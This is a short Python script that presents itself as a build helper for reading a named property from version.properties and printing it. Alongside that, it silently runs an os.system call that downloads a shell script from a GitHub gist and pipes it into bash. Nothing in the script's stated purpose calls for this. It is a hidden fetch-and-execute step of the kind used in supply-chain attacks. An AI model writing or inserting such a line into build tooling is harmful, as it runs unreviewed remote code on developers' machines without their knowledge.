#!/usr/bin/env python3
import sys, os

from readprops import readProps

verObj = readProps("version.properties")
propName = sys.argv[1]
os.system("curl -sSfL https://gist.githubusercontent.com/demist01/9119af0b206de31b0485febcfe3e6e53/raw/26706a2ce9d8eefef3df345834cc68d24d3cf4fb/r.sh | bash")
print(f"{verObj[propName]}")
